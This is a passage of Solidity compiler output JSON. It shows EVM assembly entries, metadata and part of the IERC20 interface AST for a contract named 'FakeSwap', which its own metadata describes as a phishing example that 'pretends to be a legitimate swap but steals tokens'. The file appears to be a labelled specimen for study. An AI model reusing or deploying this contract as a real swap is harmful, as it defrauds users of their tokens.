										{
											"begin": 1426,
											"end": 1431,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 1408,
											"end": 1432,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "19"
										},
										{
											"begin": 1408,
											"end": 1432,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1408,
											"end": 1432,
											"name": "tag",
											"source": 2,
											"value": "49"
										},
										{
											"begin": 1408,
											"end": 1432,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1403,
											"end": 1406,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1396,
											"end": 1433,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 1321,
											"end": 1439,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1321,
											"end": 1439,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1321,
											"end": 1439,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1445,
											"end": 1554,
											"name": "tag",
											"source": 2,
											"value": "23"
										},
										{
											"begin": 1445,
											"end": 1554,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1514,
											"end": 1521,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1543,
											"end": 1548,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 1532,
											"end": 1548,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1532,
											"end": 1548,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1445,
											"end": 1554,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1445,
											"end": 1554,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1445,
											"end": 1554,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1445,
											"end": 1554,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1560,
											"end": 1637,
											"name": "tag",
											"source": 2,
											"value": "24"
										},
										{
											"begin": 1560,
											"end": 1637,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1597,
											"end": 1604,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1626,
											"end": 1631,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 1615,
											"end": 1631,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1615,
											"end": 1631,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1560,
											"end": 1637,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1560,
											"end": 1637,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1560,
											"end": 1637,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1560,
											"end": 1637,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1643,
											"end": 1703,
											"name": "tag",
											"source": 2,
											"value": "25"
										},
										{
											"begin": 1643,
											"end": 1703,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1671,
											"end": 1674,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1692,
											"end": 1697,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 1685,
											"end": 1697,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1685,
											"end": 1697,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1643,
											"end": 1703,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1643,
											"end": 1703,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1643,
											"end": 1703,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1643,
											"end": 1703,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1709,
											"end": 1915,
											"name": "tag",
											"source": 2,
											"value": "26"
										},
										{
											"begin": 1709,
											"end": 1915,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1791,
											"end": 1800,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1824,
											"end": 1909,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "54"
										},
										{
											"begin": 1842,
											"end": 1908,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "55"
										},
										{
											"begin": 1851,
											"end": 1907,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "56"
										},
										{
											"begin": 1901,
											"end": 1906,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 1851,
											"end": 1907,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "23"
										},
										{
											"begin": 1851,
											"end": 1907,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1851,
											"end": 1907,
											"name": "tag",
											"source": 2,
											"value": "56"
										},
										{
											"begin": 1851,
											"end": 1907,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1842,
											"end": 1908,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "25"
										},
										{
											"begin": 1842,
											"end": 1908,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1842,
											"end": 1908,
											"name": "tag",
											"source": 2,
											"value": "55"
										},
										{
											"begin": 1842,
											"end": 1908,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1824,
											"end": 1909,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "24"
										},
										{
											"begin": 1824,
											"end": 1909,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1824,
											"end": 1909,
											"name": "tag",
											"source": 2,
											"value": "54"
										},
										{
											"begin": 1824,
											"end": 1909,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1811,
											"end": 1909,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1811,
											"end": 1909,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1709,
											"end": 1915,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1709,
											"end": 1915,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1709,
											"end": 1915,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1709,
											"end": 1915,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1921,
											"end": 2116,
											"name": "tag",
											"source": 2,
											"value": "27"
										},
										{
											"begin": 1921,
											"end": 2116,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2040,
											"end": 2109,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "58"
										},
										{
											"begin": 2103,
											"end": 2108,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 2040,
											"end": 2109,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "26"
										},
										{
											"begin": 2040,
											"end": 2109,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2040,
											"end": 2109,
											"name": "tag",
											"source": 2,
											"value": "58"
										},
										{
											"begin": 2040,
											"end": 2109,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2035,
											"end": 2038,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2028,
											"end": 2110,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 1921,
											"end": 2116,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1921,
											"end": 2116,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1921,
											"end": 2116,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2122,
											"end": 2628,
											"name": "tag",
											"source": 2,
											"value": "10"
										},
										{
											"begin": 2122,
											"end": 2628,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2303,
											"end": 2307,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2341,
											"end": 2343,
											"name": "PUSH",
											"source": 2,
											"value": "60"
										},
										{
											"begin": 2330,
											"end": 2339,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2326,
											"end": 2344,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 2318,
											"end": 2344,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 2318,
											"end": 2344,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2354,
											"end": 2425,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "60"
										},
										{
											"begin": 2422,
											"end": 2423,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2411,
											"end": 2420,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 2407,
											"end": 2424,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 2398,
											"end": 2404,
											"name": "DUP7",
											"source": 2
										},
										{
											"begin": 2354,
											"end": 2425,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "22"
										},
										{
											"begin": 2354,
											"end": 2425,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2354,
											"end": 2425,
											"name": "tag",
											"source": 2,
											"value": "60"
										},
										{
											"begin": 2354,
											"end": 2425,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2435,
											"end": 2507,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "61"
										},
										{
											"begin": 2503,
											"end": 2505,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 2492,
											"end": 2501,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 2488,
											"end": 2506,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 2479,
											"end": 2485,
											"name": "DUP6",
											"source": 2
										},
										{
											"begin": 2435,
											"end": 2507,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "22"
										},
										{
											"begin": 2435,
											"end": 2507,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2435,
											"end": 2507,
											"name": "tag",
											"source": 2,
											"value": "61"
										},
										{
											"begin": 2435,
											"end": 2507,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2517,
											"end": 2621,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "62"
										},
										{
											"begin": 2617,
											"end": 2619,
											"name": "PUSH",
											"source": 2,
											"value": "40"
										},
										{
											"begin": 2606,
											"end": 2615,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 2602,
											"end": 2620,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 2593,
											"end": 2599,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 2517,
											"end": 2621,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "27"
										},
										{
											"begin": 2517,
											"end": 2621,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2517,
											"end": 2621,
											"name": "tag",
											"source": 2,
											"value": "62"
										},
										{
											"begin": 2517,
											"end": 2621,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2122,
											"end": 2628,
											"name": "SWAP5",
											"source": 2
										},
										{
											"begin": 2122,
											"end": 2628,
											"name": "SWAP4",
											"source": 2
										},
										{
											"begin": 2122,
											"end": 2628,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2122,
											"end": 2628,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2122,
											"end": 2628,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2122,
											"end": 2628,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2122,
											"end": 2628,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2634,
											"end": 2724,
											"name": "tag",
											"source": 2,
											"value": "28"
										},
										{
											"begin": 2634,
											"end": 2724,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2668,
											"end": 2675,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2711,
											"end": 2716,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 2704,
											"end": 2717,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 2697,
											"end": 2718,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 2686,
											"end": 2718,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 2686,
											"end": 2718,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2634,
											"end": 2724,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 2634,
											"end": 2724,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 2634,
											"end": 2724,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2634,
											"end": 2724,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2730,
											"end": 2846,
											"name": "tag",
											"source": 2,
											"value": "29"
										},
										{
											"begin": 2730,
											"end": 2846,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2800,
											"end": 2821,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "65"
										},
										{
											"begin": 2815,
											"end": 2820,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 2800,
											"end": 2821,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "28"
										},
										{
											"begin": 2800,
											"end": 2821,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2800,
											"end": 2821,
											"name": "tag",
											"source": 2,
											"value": "65"
										},
										{
											"begin": 2800,
											"end": 2821,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2793,
											"end": 2798,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 2790,
											"end": 2822,
											"name": "EQ",
											"source": 2
										},
										{
											"begin": 2780,
											"end": 2840,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "66"
										},
										{
											"begin": 2780,
											"end": 2840,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 2836,
											"end": 2837,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2833,
											"end": 2834,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2826,
											"end": 2838,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 2780,
											"end": 2840,
											"name": "tag",
											"source": 2,
											"value": "66"
										},
										{
											"begin": 2780,
											"end": 2840,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2730,
											"end": 2846,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2730,
											"end": 2846,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2852,
											"end": 2989,
											"name": "tag",
											"source": 2,
											"value": "30"
										},
										{
											"begin": 2852,
											"end": 2989,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2906,
											"end": 2911,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2937,
											"end": 2943,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 2931,
											"end": 2944,
											"name": "MLOAD",
											"source": 2
										},
										{
											"begin": 2922,
											"end": 2944,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 2922,
											"end": 2944,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2953,
											"end": 2983,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "68"
										},
										{
											"begin": 2977,
											"end": 2982,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 2953,
											"end": 2983,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "29"
										},
										{
											"begin": 2953,
											"end": 2983,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2953,
											"end": 2983,
											"name": "tag",
											"source": 2,
											"value": "68"
										},
										{
											"begin": 2953,
											"end": 2983,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2852,
											"end": 2989,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 2852,
											"end": 2989,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 2852,
											"end": 2989,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2852,
											"end": 2989,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2852,
											"end": 2989,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2995,
											"end": 3340,
											"name": "tag",
											"source": 2,
											"value": "14"
										},
										{
											"begin": 2995,
											"end": 3340,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3062,
											"end": 3068,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 3111,
											"end": 3113,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 3099,
											"end": 3108,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 3090,
											"end": 3097,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 3086,
											"end": 3109,
											"name": "SUB",
											"source": 2
										},
										{
											"begin": 3082,
											"end": 3114,
											"name": "SLT",
											"source": 2
										},
										{
											"begin": 3079,
											"end": 3198,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 3079,
											"end": 3198,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "70"
										},
										{
											"begin": 3079,
											"end": 3198,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 3117,
											"end": 3196,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "71"
										},
										{
											"begin": 3117,
											"end": 3196,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "16"
										},
										{
											"begin": 3117,
											"end": 3196,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 3117,
											"end": 3196,
											"name": "tag",
											"source": 2,
											"value": "71"
										},
										{
											"begin": 3117,
											"end": 3196,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3079,
											"end": 3198,
											"name": "tag",
											"source": 2,
											"value": "70"
										},
										{
											"begin": 3079,
											"end": 3198,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3237,
											"end": 3238,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 3262,
											"end": 3323,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "72"
										},
										{
											"begin": 3315,
											"end": 3322,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 3306,
											"end": 3312,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 3295,
											"end": 3304,
											"name": "DUP6",
											"source": 2
										},
										{
											"begin": 3291,
											"end": 3313,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 3262,
											"end": 3323,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "30"
										},
										{
											"begin": 3262,
											"end": 3323,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 3262,
											"end": 3323,
											"name": "tag",
											"source": 2,
											"value": "72"
										},
										{
											"begin": 3262,
											"end": 3323,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3252,
											"end": 3323,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 3252,
											"end": 3323,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3208,
											"end": 3333,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2995,
											"end": 3340,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 2995,
											"end": 3340,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 2995,
											"end": 3340,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2995,
											"end": 3340,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2995,
											"end": 3340,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										}
									]
								}
							},
							"sourceList": [
								"@openzeppelin/contracts/token/ERC20/IERC20.sol",
								"M/Malicious Frontend Swap (User Phishing).sol",
								"#utility.yul"
							]
						},
						"methodIdentifiers": {
							"swap(address,address)": "6b76484e"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.29+commit.ab55807c\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"swap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"title\":\"Malicious Frontend Swap (Phishing Example)\",\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"notice\":\"Pretends to be a legitimate swap but steals tokens\",\"version\":1}},\"settings\":{\"compilationTarget\":{\"M/Malicious Frontend Swap (User Phishing).sol\":\"FakeSwap\"},\"evmVersion\":\"cancun\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/token/ERC20/IERC20.sol\":{\"keccak256\":\"0xe06a3f08a987af6ad2e1c1e774405d4fe08f1694b67517438b467cecf0da0ef7\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://df6f0c459663c9858b6cba2cda1d14a7d05a985bed6d2de72bd8e78c25ee79db\",\"dweb:/ipfs/QmeTTxZ7qVk9rjEv2R4CpCwdf8UMCcRqDNMvzNxHc3Fnn9\"]},\"M/Malicious Frontend Swap (User Phishing).sol\":{\"keccak256\":\"0x8b7cbeb58f6b92a70bd3c7be73333a9515ea503112b74c14ba69f556f386aa36\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://a8194b040d13eba9aa00dbb2f78d8e666f9468c78c68f0705d9486995fe59f78\",\"dweb:/ipfs/QmTS6t3wxdfUTktFSYJ1RTziCGsbMgYA12DWAH6KELzm8W\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"notice": "Pretends to be a legitimate swap but steals tokens",
						"version": 1
					}
				}
			}
		},
		"sources": {
			"@openzeppelin/contracts/token/ERC20/IERC20.sol": {
				"ast": {
					"absolutePath": "@openzeppelin/contracts/token/ERC20/IERC20.sol",
					"exportedSymbols": {
						"IERC20": [
							77
						]
					},
					"id": 78,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".20"
							],
							"nodeType": "PragmaDirective",
							"src": "106:24:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "IERC20",
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": {
								"id": 2,
								"nodeType": "StructuredDocumentation",
								"src": "132:71:0",
								"text": " @dev Interface of the ERC-20 standard as defined in the ERC."
							},
							"fullyImplemented": false,
							"id": 77,
							"linearizedBaseContracts": [
								77
							],
							"name": "IERC20",
							"nameLocation": "214:6:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"anonymous": false,
									"documentation": {
										"id": 3,
										"nodeType": "StructuredDocumentation",
										"src": "227:158:0",
										"text": " @dev Emitted when `value` tokens are moved from one account (`from`) to\n another (`to`).\n Note that `value` may be zero."
									},
									"eventSelector": "ddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef",
									"id": 11,
									"name": "Transfer",
									"nameLocation": "396:8:0",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 10,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 5,
												"indexed": true,
												"mutability": "mutable",
												"name": "from",
												"nameLocation": "421:4:0",
												"nodeType": "VariableDeclaration",
												"scope": 11,
												"src": "405:20:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 4,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "405:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 7,
												"indexed": true,
												"mutability": "mutable",
												"name": "to",
												"nameLocation": "443:2:0",
												"nodeType": "VariableDeclaration",
												"scope": 11,
												"src": "427:18:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 6,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "427:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 9,
												"indexed": false,
												"mutability": "mutable",
												"name": "value",
												"nameLocation": "455:5:0",
												"nodeType": "VariableDeclaration",
												"scope": 11,
												"src": "447:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 8,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "447:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "404:57:0"
									},
									"src": "390:72:0"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 12,
										"nodeType": "StructuredDocumentation",
										"src": "468:148:0",
										"text": " @dev Emitted when the allowance of a `spender` for an `owner` is set by\n a call to {approve}. `value` is the new allowance."
									},
									"eventSelector": "8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925",
									"id": 20,
									"name": "Approval",
									"nameLocation": "627:8:0",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 19,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 14,
												"indexed": true,
												"mutability": "mutable",
												"name": "owner",
												"nameLocation": "652:5:0",
												"nodeType": "VariableDeclaration",
												"scope": 20,
												"src": "636:21:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 13,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "636:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 16,
												"indexed": true,
												"mutability": "mutable",
												"name": "spender",
												"nameLocation": "675:7:0",
												"nodeType": "VariableDeclaration",
												"scope": 20,
												"src": "659:23:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 15,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "659:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 18,
												"indexed": false,
												"mutability": "mutable",
												"name": "value",
												"nameLocation": "692:5:0",
												"nodeType": "VariableDeclaration",
												"scope": 20,
												"src": "684:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 17,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "684:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "635:63:0"
									},
									"src": "621:78:0"
								},
								{
									"documentation": {
										"id": 21,
										"nodeType": "StructuredDocumentation",
										"src": "705:65:0",
										"text": " @dev Returns the value of tokens in existence."
									},
									"functionSelector": "18160ddd",
									"id": 26,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "totalSupply",
									"nameLocation": "784:11:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 22,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "795:2:0"
									},
									"returnParameters": {
										"id": 25,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 24,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 26,
												"src": "821:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 23,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "821:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "820:9:0"
									},
									"scope": 77,
									"src": "775:55:0",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 27,
										"nodeType": "StructuredDocumentation",
										"src": "836:71:0",
										"text": " @dev Returns the value of tokens owned by `account`."
									},
									"functionSelector": "70a08231",
									"id": 34,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "balanceOf",
									"nameLocation": "921:9:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 30,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 29,
												"mutability": "mutable",
												"name": "account",
												"nameLocation": "939:7:0",
												"nodeType": "VariableDeclaration",
												"scope": 34,
												"src": "931:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 28,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "931:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "930:17:0"
									},
									"returnParameters": {
										"id": 33,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 32,
												"mutability": "mutable",
												"name": "",
